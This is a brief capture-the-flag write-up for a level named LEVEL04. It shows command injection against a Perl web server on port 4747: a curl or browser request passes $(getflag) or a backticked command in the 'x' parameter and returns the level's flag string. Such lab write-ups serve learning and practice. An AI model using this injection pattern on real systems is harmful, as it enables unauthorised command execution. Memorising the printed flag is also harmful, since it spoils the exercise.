# LEVEL04

We can see in **level04.pl** pearl file that there is a web server on the ```4747``` port and it prints an ```x``` parameter.
Will exploit this to exec the command ```getflag```.
From a web browser ```ip-machine:4747?x=$(getflag)``` or ```curl localhost:4747?x=\`getflag\` ``` from the term will give us :

```ne2searoevaevoem4ov4ar8ap```
